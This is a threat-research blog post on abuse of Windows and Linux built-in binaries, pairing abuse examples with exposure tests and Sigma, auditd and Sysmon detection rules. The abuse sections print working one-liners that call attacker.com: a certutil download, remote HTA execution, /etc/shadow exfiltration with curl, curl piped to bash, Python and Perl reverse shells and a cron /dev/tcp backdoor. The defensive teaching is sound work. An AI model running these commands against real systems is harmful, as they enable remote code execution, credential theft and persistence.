---
title: "Living Off the Land: A Technical Case Study in LOLBin Abuse"
date: 2025-09-10
categories: [Case Studies]
tags: [threat-research, lolbins, lolbas, defense-evasion, red-team, blue-team]
description: "A per-tool breakdown of how LOLBins work, how they're abused, how to test for exposure, and what defenders can actually do about it."
---

Detection engineering has a needle-in-a-haystack problem. LOLBin abuse makes it a needle-in-a-stack-of-needles problem. The malicious invocation looks nearly identical to the legitimate one. The binary is signed by Microsoft. The process is expected to exist. The network traffic is indistinguishable from normal operations at first glance. There is no payload to hash, no dropper to sandbox, no import table to scan. Just the OS doing what it was built to do, pointed somewhere it shouldn't go.

This post is a technical case study covering six LOLBin primitives across Windows and Linux. For each one: how it works legitimately, how it gets abused, how to test whether your environment is exposed, and what defenders can build or configure to detect or prevent misuse. This is reference material. Hoard it.

---

## certutil.exe

### How It Works

`certutil.exe` is a Windows command-line tool for managing certificate authority (CA) data and certificates. It ships with every modern Windows installation and runs under user context. Its legitimate functions include displaying certificate information, verifying certificate chains, and encoding or decoding Base64 data.

The Base64 codec and URL retrieval capabilities are the attack surface.

### How It Gets Abused

Attackers use certutil for two primary operations: file download and payload decoding.

**File download via URL cache:**
```
certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\Windows\Temp\payload.exe
```

The `-urlcache` flag is intended for managing the local URL cache for certificate revocation. The `-f` flag forces a download. The result is an arbitrary file written to disk from any HTTP/HTTPS endpoint, executed through a signed Microsoft binary with no native AV tripwire.

**Base64 decode:**
```
certutil.exe -decode encoded.b64 payload.exe
```

A common two-stage delivery pattern: stage an encoded payload as a `.txt` or `.b64` file (less likely to be flagged by mail gateways or web proxies), then decode it on the victim host using certutil. The encoded blob is inert in transit; certutil does the reconstruction locally.

**MITRE ATT&CK mapping:** [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1140 - Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140/)

### Testing Exposure

From a test host, run the following and observe whether it completes successfully:

```powershell
certutil.exe -urlcache -split -f http://example.com/test.txt C:\Windows\Temp\loltest.txt
```

If the file lands, your environment has no egress restriction or proxy rule blocking certutil outbound connections. Clean up with:

```
certutil.exe -urlcache -f http://example.com/test.txt delete
del C:\Windows\Temp\loltest.txt
```

Check whether Windows Event ID 4688 captures the full command line. If the `Process Command Line` field is blank, command-line auditing is not enabled and you have a visibility gap regardless of what the tool is doing.

### The Defense

**Restrict outbound HTTP/HTTPS from certutil.exe at the proxy or firewall.** Application-aware firewalls and web proxies can block outbound connections where the user agent or process name is `CertUtil`. This is the highest-fidelity prevention control available. Most enterprise environments have no legitimate need for certutil to reach the public internet.

**Enable command-line auditing (Windows Event ID 4688).** Group Policy path: `Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Detailed Tracking > Audit Process Creation`. Enable "Include command line in process creation events." Without this, you only know that certutil ran. You do not know what it was told to do.

**Detection rule (Sigma-style logic):**

```yaml
detection:
  selection:
    EventID: 4688
    NewProcessName|endswith: '\certutil.exe'
    ProcessCommandLine|contains:
      - '-urlcache'
      - '-decode'
      - '-encode'
      - 'http'
  condition: selection
```

Flag any certutil invocation containing `-urlcache`, `-decode`, or a URL string. False positives are rare in environments where certutil is not part of a PKI management workflow.

**Sysmon Event ID 3 (Network Connection) correlation:** If you are running Sysmon, correlate process creation events for certutil with outbound network connections. A legitimate certutil invocation on a workstation that is not performing certificate management has no business making an outbound connection to a public IP.

---

## mshta.exe

### How It Works

`mshta.exe` (Microsoft HTML Application Host) is the Windows runtime for `.hta` files. HTA files are HTML documents with elevated privileges: they run in a trusted zone and have access to the full Windows Script Host object model, including `WScript.Shell`, `FileSystemObject`, and COM objects. The binary ships with Windows and is signed by Microsoft.

### How It Gets Abused

Because mshta runs scripts from remote URLs without writing a traditional executable to disk, it is a common phishing delivery vehicle. The payload lives on an attacker-controlled server. The victim runs one command or clicks one link, and execution happens through a trusted Microsoft binary.

**Remote HTA execution:**
```
mshta.exe http://attacker.com/payload.hta
```

The `.hta` file is fetched and executed in memory. A typical payload spawns a reverse shell or stages a second-stage loader using VBScript or JScript.

**Inline script execution (no remote file required):**
```
mshta.exe vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell.exe -enc [base64]"",0:close")
```

This passes the entire script as a command-line argument. Nothing is written to disk. The process tree is: `mshta.exe` spawns `powershell.exe`. Without parent-process visibility, the PowerShell invocation looks like any other.

**MITRE ATT&CK mapping:** [T1218.005 - System Binary Proxy Execution: Mshta](https://attack.mitre.org/techniques/T1218/005/)

### Testing Exposure

Create a benign `.hta` file locally and execute it to verify command-line logging captures the invocation:

```html
<html>
<head>
<script language="VBScript">
  MsgBox "mshta test"
  window.close
</script>
</head>
</html>
```

```
mshta.exe C:\temp\test.hta
```

Then test remote fetch:
```
mshta.exe http://example.com/test.hta
```

Note whether your proxy or EDR generates any alert. If neither fires on a remote `.hta` fetch, you have a gap.

### The Defense

**Block mshta.exe from making outbound network connections.** There is almost no legitimate reason for mshta to reach a remote URL in a managed enterprise environment. A host-based firewall rule or endpoint policy blocking outbound connections from `mshta.exe` eliminates the remote delivery vector entirely.

**AppLocker / WDAC policy.** If your environment uses Application Control, mshta.exe can be blocked outright for standard users. The Microsoft recommended block rules for WDAC include mshta as a known proxy execution binary. See [Microsoft's recommended block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac).

**Detection: parent-child process anomalies.** Flag `mshta.exe` spawning any of the following child processes:

```yaml
detection:
  selection:
    EventID: 4688
    ParentProcessName|endswith: '\mshta.exe'
    NewProcessName|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\cscript.exe'
  condition: selection
```

**Detection: mshta.exe with URL in command line:**

```yaml
detection:
  selection:
    EventID: 4688
    NewProcessName|endswith: '\mshta.exe'
    ProcessCommandLine|contains:
      - 'http://'
      - 'https://'
      - 'vbscript:'
      - 'javascript:'
  condition: selection
```

Legitimate mshta invocations in enterprise environments point to local or UNC paths, not public URLs.

---

## rundll32.exe

### How It Works

`rundll32.exe` is a Windows utility for executing functions exported by DLL files. Its intended use is to load a DLL and call a specific exported function:

```
rundll32.exe shell32.dll,Control_RunDLL desk.cpl
```

That example opens Display Properties. The binary is ubiquitous, signed, and expected to run on essentially every Windows host.

### How It Gets Abused

Because rundll32 loads and executes arbitrary DLL code, it is a flexible proxy execution primitive. An attacker who can write a DLL to disk (or access a remote share) can execute code through a signed system binary.

**Execute arbitrary DLL:**
```
rundll32.exe C:\Windows\Temp\evil.dll,EntryPoint
```

**JavaScript execution (legacy IE engine, works on older systems):**
```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")
```

This one is older and increasingly blocked by modern EDR, but it still appears in commodity campaigns targeting unpatched environments.

**Execute via COM object (squiblydoo variant using regsvr32 is better known, but rundll32 has similar vectors):**
```
rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta
```

`url.dll` is a legitimate Windows library for handling URL protocols. `OpenURL` will fetch and execute the remote HTA through the shell.

**MITRE ATT&CK mapping:** [T1218.011 - System Binary Proxy Execution: Rundll32](https://attack.mitre.org/techniques/T1218/011/)

### Testing Exposure

Test whether rundll32 can spawn a child process:

```
rundll32.exe url.dll,OpenURL http://example.com/test.hta
```

Test whether your EDR or SIEM captures the command line and flags the child process relationship.

### The Defense

**Sysmon Event ID 7 (Image Loaded) for unsigned DLLs loaded by rundll32.** This is high-value telemetry. If rundll32 loads a DLL that is not signed by a trusted publisher, that is worth investigating. Configure Sysmon's ImageLoad rule to capture DLLs loaded by rundll32:

```xml
<RuleGroup name="" groupRelation="or">
  <ImageLoad onmatch="include">
    <Image condition="end with">rundll32.exe</Image>
  </ImageLoad>
</RuleGroup>
```

This will be noisy at first. Tune against your baseline of known-good DLL load patterns.

**Detection: rundll32 with network indicators or suspicious arguments:**

```yaml
detection:
  selection:
    EventID: 4688
    NewProcessName|endswith: '\rundll32.exe'
    ProcessCommandLine|contains:
      - 'javascript:'
      - 'http://'
      - 'https://'
      - 'url.dll'
      - '.sct'
  condition: selection
```

**Detection: rundll32 with no command-line arguments.** Legitimate rundll32 invocations always include a DLL and a function name. Rundll32 executing with an empty or malformed argument string is a strong indicator of process hollowing or in-memory injection.

**Block rundll32 from making outbound connections** at the host firewall level. Legitimate use cases for rundll32 reaching the internet are essentially nonexistent in managed environments.

---

## curl / wget (Linux)

### How It Works

`curl` and `wget` are standard HTTP/HTTPS/FTP transfer utilities available on virtually every Linux system. They handle file retrieval, form submission, and protocol interaction from the command line. Present by default on most distributions, and installed as a dependency by countless packages even when not explicitly requested.

### How It Gets Abused

On a compromised Linux host, curl and wget are the default tools for pulling down second-stage payloads, exfiltrating data, and issuing C2 callbacks because they are always present and their traffic pattern is indistinguishable from application-generated HTTP.

**Payload staging:**
```bash
curl -o /tmp/.hidden http://attacker.com/stage2.elf && chmod +x /tmp/.hidden && /tmp/.hidden
```

**Data exfiltration:**
```bash
curl -X POST -d @/etc/shadow http://attacker.com/collect
```

**Reverse shell via curl to controlled endpoint (less common but observed):**
```bash
curl http://attacker.com/shell.sh | bash
```

The pipe-to-bash pattern is worth calling out specifically because it never writes the script to disk. The payload exists only in memory during execution.

**MITRE ATT&CK mapping:** [T1105 - Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/), [T1048 - Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)

### Testing Exposure

On a representative Linux host, run:

```bash
curl -o /tmp/loltest http://example.com/ && ls -la /tmp/loltest
```

Check whether your SIEM or EDR captures the process execution with full arguments. On Linux, this requires either auditd with syscall rules or an EDR agent with process telemetry. If you are relying solely on syslog, you likely have no visibility here.

Check whether egress filtering is in place:

```bash
curl -v http://169.254.169.254/latest/meta-data/  # AWS IMDS test
```

If that returns metadata on a cloud instance, your instance has no IMDS v2 enforcement or egress filtering, which is a broader problem than LOLBins.

### The Defense

**Auditd rules for curl and wget.** The Linux Audit Daemon captures syscall-level events. The following rule logs all execve calls involving curl or wget:

```
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/curl -k curl_exec
-a always,exit -F arch=b64 -S execve -F exe=/usr/bin/wget -k wget_exec
```

Pipe this into your SIEM and build alerting on invocations that include IPs outside your expected egress ranges, flag file writes to world-writable directories (`/tmp`, `/dev/shm`, `/var/tmp`), or combine with a `chmod +x` within the same session.

**Egress filtering.** Workloads that do not need arbitrary outbound HTTP should not have it. Linux servers in controlled environments should reach a defined set of destinations. A firewall policy that defaults-deny outbound and permits only expected destinations makes curl-based payload staging significantly harder regardless of what the binary is.

**Alert on pipe-to-shell patterns.** This requires process execution logging with arguments. A detection rule watching for `bash` or `sh` with a parent process of `curl` is low-volume and high-fidelity in most environments.

**On cloud infrastructure,** restrict IMDS access to IMDSv2-only and use VPC flow logs to detect unexpected outbound connections from compute instances.

---

## python3 / perl / bash

### How It Works

Script interpreters ship with virtually every Linux distribution. Python3 is installed as a system dependency on most modern systems. Perl remains common on older infrastructure. Bash is the default shell everywhere. All three can execute arbitrary code, make network connections, write files, and spawn child processes without any additional tooling.

### How It Gets Abused

Interpreters are Swiss Army knives for post-exploitation. The most common uses are shell stabilization, reverse shells, and persistence scripting.

**Python reverse shell:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash"])'
```

**Shell stabilization (TTY upgrade):**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This is present in essentially every CTF writeup and real-world post-exploitation guide for a reason: it works, it uses a tool that is already on the box, and it is very hard to distinguish from a legitimate developer or admin TTY upgrade.

**Perl reverse shell:**
```perl
perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

**Bash persistence via crontab:**
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1") | crontab -
```

**MITRE ATT&CK mapping:** [T1059.006 - Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/), [T1059.004 - Unix Shell](https://attack.mitre.org/techniques/T1059/004/)

### Testing Exposure

Verify your process telemetry captures interpreter arguments:

```bash
python3 -c 'import socket; print(socket.gethostname())'
```

Check your SIEM for this event. If you see `python3` as the process but no command-line arguments, you have an auditd configuration gap.

Test whether outbound socket connections from interpreter processes are logged:

```bash
python3 -c 'import urllib.request; urllib.request.urlopen("http://example.com")'
```

Correlate against network flow logs. If a Python process makes an outbound connection that is not associated with a known application, that is worth flagging.

### The Defense

**Process execution logging with full arguments is non-negotiable here.** Without command-line arguments, you see `python3` ran. With them, you see it spawned a socket and exec'd a shell. The difference in detection value is absolute. Auditd `execve` rules for `/usr/bin/python3`, `/usr/bin/perl`, and `/bin/bash` are the baseline.

**Anomaly-based detection on interpreter network activity.** In most production environments, Python processes that make outbound TCP connections do so from a small set of known application processes (web app servers, scheduled jobs, monitoring agents). A Python process making an outbound connection on port 4444, or to a public IP not in your egress allow list, is a high-fidelity signal.

**SIEM correlation rule: interpreter spawning interactive shell:**

Look for processes where `python3`, `perl`, or `bash -i` is the parent and the child is `/bin/bash` or `/bin/sh`. The `pty.spawn` pattern is particularly distinctive: `python3 -c` with `pty` in the argument string, spawning bash as a child process.

**Restrict interpreter access on production servers where scripting is not required.** This is easier said than done, but servers running compiled applications have no operational need for an interactive Python session. AppArmor or SELinux profiles can restrict which processes interpreters can spawn.

**Monitor crontab modifications.** Changes to crontab files should be logged and alerted on, particularly when the modification occurs outside a change window or is made by an account that does not normally schedule jobs.

---

## Why Detection Is Hard (and Why That Is the Point)

The detection challenge is not identifying that `certutil.exe` ran. It is determining whether the specific invocation of `certutil.exe` was legitimate or malicious. This requires behavioral context that signature-based detection does not provide.

What process spawned it? What was the parent? What was the network destination? Is this consistent with the host's baseline behavior? Does this machine normally run this binary at all?

Behavioral detection closes the gap, but it generates noise, requires tuning, and is only as good as the baseline you establish. An attacker who does reconnaissance before executing knows what normal looks like on the target. They time their activity to blend. The better-resourced the operator, the more deliberate the blending.

This is not a reason to give up on behavioral detection. It is a reason to build it carefully, instrument it deeply, and understand the attack surface before you write the first rule.

---

## Lessons Learned

A few things that fall out of mapping these techniques end to end:

**You cannot detect what you cannot log.** The single largest gap across every technique in this post is the same: command-line argument logging is either missing or not forwarded to the SIEM. Event ID 4688 without `ProcessCommandLine` is nearly useless for LOLBin detection. Auditd `execve` rules without argument capture are the same problem on Linux. Fix the logging before you write a single detection rule.

**Egress filtering is underrated.** A meaningful portion of these techniques depend on the LOLBin reaching an attacker-controlled server. Application-aware egress filtering that restricts which binaries can initiate outbound connections eliminates whole categories of attack. It is not glamorous work, but it has a higher return on investment than tuning detection rules for traffic you could have blocked.

**Know your baseline before you write rules.** A detection rule for certutil making outbound connections is useless if your PKI team runs certutil against external OCSP endpoints every day. The rule will fire constantly, get tuned to silence, and provide no value. Baseline first. Rule second.

**The LOLBAS and GTFOBins catalogs are a detection backlog.** Go through them and ask: which of these binaries exist in my environment? Which have network or execution capabilities I am not monitoring? Every entry in those catalogs that applies to your environment and has no corresponding detection rule is an open gap. Treat it like one.

**Parent-child process relationships are more reliable signals than specific tool invocations.** `Word.exe` spawning `powershell.exe` is a well-known phishing indicator. `IIS worker process` spawning `cmd.exe` deserves investigation. `mshta.exe` spawning `powershell.exe` should be treated as a confirmed incident until proven otherwise. These relationships are harder for attackers to obfuscate than the specific binary they choose to use.

**Detection engineering is a hoarder's profession.** Log everything you can justify storing. Build rules for techniques you have not seen yet. The gap between "we were not logging that" and "we would have caught it" closes exactly once.

---

*References: [LOLBAS Project](https://lolbas-project.github.io/) · [GTFOBins](https://gtfobins.github.io/) · [MITRE ATT&CK - Defense Evasion (TA0005)](https://attack.mitre.org/tactics/TA0005/) · [Microsoft WDAC Recommended Block Rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac) · [T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) · [T1218 System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218/)*
